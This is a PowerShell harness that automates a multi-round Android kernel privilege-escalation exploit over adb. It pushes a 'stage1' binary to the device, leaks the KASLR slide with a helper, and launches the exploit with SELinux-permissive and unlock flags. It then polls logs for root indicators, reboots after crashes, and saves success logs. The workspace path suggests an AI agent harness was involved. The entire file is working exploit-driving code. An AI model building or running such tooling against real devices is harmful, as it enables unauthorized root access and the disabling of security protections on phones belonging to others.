param([string]$d = "4TONMFDMIN8XFEOZ", [int]$rounds = 4, [int]$maxPoll = 130, [int]$minUptimeSec = 60,
      [string]$bin = "D:\resource\deepseek-harness-workspace\ghostlock-rmx3031-32\stage1", [string]$md5 = "")

$ErrorActionPreference = "SilentlyContinue"
adb start-server 2>$null | Out-Null

# Wait for clean baseline: uptime >= $minUptimeSec AND zero stage1 residual procs.
function Wait-CleanBaseline([string]$dev, [int]$minUp) {
    for ($w = 1; $w -le 60; $w++) {
        adb -s $dev wait-for-device 2>$null | Out-Null
        Start-Sleep -Seconds 2
        $up = (adb -s $dev shell "cat /proc/uptime" 2>$null | Out-String).Trim()
        $sec = -1
        if ($up -match '^([0-9]+)\.') { $sec = [int]$Matches[1] }
        $procs = (adb -s $dev shell "ps -A | grep stage1 | grep -v grep | wc -l" 2>$null | Out-String).Trim()
        if ($sec -ge $minUp -and $procs -match '^0') {
            Write-Output "baseline OK: uptime=${sec}s procs=0"
            return
        }
        if ($procs -notmatch '^0') {
            Write-Output "  dirty: uptime=${sec}s procs=$procs -> reboot"
            adb -s $dev reboot 2>$null | Out-Null
            adb -s $dev wait-for-device 2>$null | Out-Null
            Start-Sleep -Seconds 10
        } else {
            Write-Output "  wait: uptime=${sec}s procs=$procs (< $minUp)"
            Start-Sleep -Seconds 10
        }
    }
    Write-Output "  !! baseline wait exceeded 60 checks, proceeding anyway"
}

for ($r = 1; $r -le $rounds; $r++) {
    Write-Output "===== ROUND $r / $rounds ====="
    Wait-CleanBaseline $d $minUptimeSec

    # f2fs may roll back to checkpoint after panic reboot: re-push binary + sync every round
    adb -s $d push $bin /data/local/tmp/stage1 2>$null | Out-Null
    adb -s $d shell "chmod 755 /data/local/tmp/stage1; sync; sync" 2>$null | Out-Null
    Start-Sleep -Seconds 2
    $devMd5 = (adb -s $d shell "md5sum /data/local/tmp/stage1" 2>$null | Out-String)
    if ($md5 -ne "" -and $devMd5 -notmatch $md5) {
        Write-Output "  !! MD5 MISMATCH: want=$md5 got=$($devMd5.Trim()) -> reboot retry"
        adb -s $d reboot 2>$null | Out-Null
        Wait-CleanBaseline $d $minUptimeSec
        continue
    }
    Write-Output "  binary ok: $($devMd5.Trim())"

    # re-solve slide (changes every boot)
    $leak = (adb -s $d shell "cd /data/local/tmp && GHOSTLOCK_LEAK_ONLY=1 timeout 50 ./gl_leak 2>&1 | grep -iE 'slide-kaslr-ok'" 2>$null | Out-String)
    $slide = $null
    if ($leak -match 'slide=([0-9a-fA-F]+)') { $slide = '0x' + $Matches[1] }
    if (-not $slide) {
        Write-Output "slide solve FAILED; reboot and retry"
        adb -s $d reboot 2>$null | Out-Null
        Wait-CleanBaseline $d $minUptimeSec
        continue
    }
    Write-Output "slide=$slide"

    $baseUp = (adb -s $d shell "cat /proc/uptime" 2>$null | Out-String)
    $baseSec = 0
    if ($baseUp -match '^([0-9]+)\.') { $baseSec = [int]$Matches[1] }

    adb -s $d shell "cd /data/local/tmp; rm -f glive.log gl_stage.mark; setsid ./stage1 --aw-fops --slide $slide --iters 2000000 --unlock-flag --permissive > glive.log 2>&1 </dev/null &" 2>$null | Out-Null

    $lastMark = ""
    $result = "TIMEOUT"
    for ($i = 1; $i -le $maxPoll; $i++) {
        Start-Sleep -Milliseconds 600
        $marks = (adb -s $d shell "cat /data/local/tmp/gl_stage.mark 2>/dev/null" | Out-String).Trim()
        if ($marks -and $marks -ne $lastMark) {
            $lastMark = $marks
            Write-Output ("  [m$i] " + ($marks -replace "`n", "|"))
        }
        # check log for deeper success indicators (get_root runs after S6 marker)
        if ($i % 5 -eq 0) {
            $lg = (adb -s $d shell "grep -aE 'ROOT|euid=0|getuid=0|su socket' /data/local/tmp/glive.log 2>/dev/null | tail -3" | Out-String)
            if ($lg -match 'ROOT|euid=0|getuid=0|su socket') {
                Write-Output "  [deep] $($lg.Trim())"
                $result = "ROOT"; break
            }
        }
        # do NOT break at S6: keep polling GR* markers until ROOT / reboot / timeout
        $up = (adb -s $d shell "cat /proc/uptime" | Out-String).Trim()
        if ($up -match '^([0-9]+)\.') {
            $secs = [int]$Matches[1]
            if ($secs -lt $baseSec) { $result = "REBOOT"; Write-Output "  !!! REBOOT at poll $i"; break }
        }
    }
    Write-Output "ROUND $r result=$result lastMark=$lastMark"

    # capture per-round log for post-mortem (always)
    $txt = (adb -s $d shell "cat /data/local/tmp/glive.log 2>/dev/null" | Out-String)
    $mk  = (adb -s $d shell "cat /data/local/tmp/gl_stage.mark 2>/dev/null" | Out-String)
    $out = "D:\resource\deepseek-harness-workspace\ghostlock-rmx3031-32\awfops_round$r.log"
    [System.IO.File]::WriteAllText($out, $txt + "`n=== MARKS ===`n" + $mk, [System.Text.Encoding]::UTF8)
    Write-Output "log saved -> $out"

    if ($result -eq "ROOT") {
        Write-Output "*** ROOT ROUND $r - capturing log ***"
        $out2 = "D:\resource\deepseek-harness-workspace\ghostlock-rmx3031-32\awfops_auto_SUCCESS.log"
        [System.IO.File]::WriteAllText($out2, $txt, [System.Text.Encoding]::UTF8)
        Write-Output "log bytes=$($txt.Length) -> $out2"
        Write-Output "=== KEY LINES ==="
        adb -s $d shell "grep -aE 'ROOT|uid=0|cred|ARBITRARY|GR[0-9]' /data/local/tmp/glive.log 2>/dev/null | tail -30" | Where-Object { $_ -match '\S' }
        break
    }

    # crash/timeout -> wait for clean reboot + baseline gate before next round
    Write-Output "waiting for reboot + clean baseline..."
    adb -s $d reboot 2>$null | Out-Null
    Wait-CleanBaseline $d $minUptimeSec
}
Write-Output "=== ALL ROUNDS DONE ==="
